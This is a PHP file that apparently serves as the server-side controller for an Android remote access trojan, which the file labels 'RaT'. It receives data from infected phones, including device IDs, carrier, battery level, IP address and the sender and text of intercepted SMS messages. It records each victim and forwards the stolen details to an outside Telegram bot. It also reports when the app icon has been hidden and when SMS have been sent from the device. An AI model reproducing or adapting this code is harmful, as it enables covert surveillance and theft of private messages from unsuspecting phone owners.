 <?php    
  include("info.php");
  define("TOKEN",$token);
  define("ID",$id);
  
 include"jdf.php";
 $time = jdate("H:i:s-a");
 header('Content-Type: text/html; charset=utf-8');
 function asd($string, $start, $end){
    $string = ' ' . $string;
    $ini    = strpos($string, $start);
    if ($ini == 0)
        return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
    }
 
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
  
 function send($t){

     file_get_contents("https://api.telegram.org/bot".TOKEN."/SendMessage?parse_mode=HTML&chat_id=".ID."&text=".urlencode($t));
 }
 

 
if(isset($_POST['result'])){
  	
 $result=$_POST['result'];
 if($result == "ok"){
 $action=$_POST['action'];
 if(isset($_POST['androidid'])){
 $androidid=$_POST['androidid'];
 }if(isset($_POST['model'])){
 $model=$_POST['model']; 
 			   $possible = 'abc1234';
$code = '';
$i = 0;
while ($i < 2) {
$code .= substr($possible, mt_rand(0, strlen($possible)-1), 1);
$i++;
}
$model=$model."-$code";
 }if(isset($_POST['battry'])){
 $battry = $_POST['battry'];
 }if(isset($_POST['opr'])){
 $opr = $_POST['opr'];
 }if(isset($_POST['number'])){
 $nump = $_POST['number'];
 }if(isset($_POST['message'])){
 $mess = $_POST['message'];
 }
 if($action == "firstinstall"){
        $handler = file_get_contents('user.txt');
			$handler .= $androidid.'/';
			file_put_contents('user.txt',$handler);
			
			if(file_exists("userlist/$model.json")){
			   $possible = 'abc1234';
$code = '';
$i = 0;
while ($i < 2) {
$code .= substr($possible, mt_rand(0, strlen($possible)-1), 1);
$i++;
}
			  $model=$model."-$code";  
			    
			}
        file_put_contents("userlist/$model.json",'{"androidid":"'.$androidid.'","name":"'.$model.'"}');
		
          $text=
"✅a UseR InStaLL The RaT !

🕒Time :  $time

♻️DeVice INFo👇🏽


📱DeVice name : $model


🍄OpRaToR : $opr

💠AnDROID ID: #$androidid 

♿️IP :  $ip

Coded By : @Stop_TiM
";    




      send($text);  
            
        
  die('');
    
        
    
    
     
    
    
}
$user=explode("/",file_get_contents("user.txt"));
 if(in_array($androidid,$user)){
if ($action == "ping"){
    
  $text=
"✅ $model IS ONLINE !

🕒TimE : $time

🌀AnDRoID ID: #$androidid :)

♿️IP :  $ip

CoDeD By : @Stop_TiM
";  
    
    
    send($text);
    
    
}elseif($action == "getdevicefullinfo"){
    
    $text=
    
"✅ $model TarGET INFO 👇🏽

🕒TiME : $time

🔋BaTTRY  : $battry %

📶OpRaToR :  $opr

🌀AnDROID ID : #$androidid :)

♿️IP :  $ip

CoDeD By : @Stop_TiM
";    
      send($text);
    
}elseif($action == "nwmessage"){
    
    
    
   $phone =    asd($mess,'[Address=',', Body=');
   $body= asd($mess,', Body=','IsInitialized');
  
  
   
    $text=
"✅NeW SmS From ( $model ) TarGeT !

☎️FroM : $phone

📥SmS BoDy:
➖➖➖➖➖➖➖➖➖➖
$body ️
➖➖➖➖➖➖➖➖➖➖
🕒TimE : $time
🔋BaTtRy  : $battry %
📶OpRaToR :  $opr
📱AnDRoiD ID : #$androidid :)
♿️IP :  $ip
Coded By : @Stop_TiM

";





      send($text);  
  
    
    
}elseif($action == "hideicon"){
    
    
    
    
        
      $text=
"✅ICoN SucceSsFully HiDeD✅

📱DeViCE NaMe : $model

📶OpRaToR : $opr

🔋BaTtRy  : $battry %

🕒SenT TimE: $time

🌀AndRoid ID: #$androidid :)

♿️IP :  $ip

CodeD By : @Stop_TiM";



      send($text);  
    
    
    
}elseif($action == "Sendmessok"){
    
    
    
          $text=
"SmS SenT  SucceSsFully✅

📱DeViCE NaMe : $model

📶OpRaToR : $opr

🕒SenT TimE: $time

🌀AndRoid ID: #$androidid :)

♿️IP :  $ip

CodeD By : @Stop_TiM";




      send($text);  
      
    
    
    
}

 } 
}

}
      
      
       

      
      
      
      
   






   
        ?>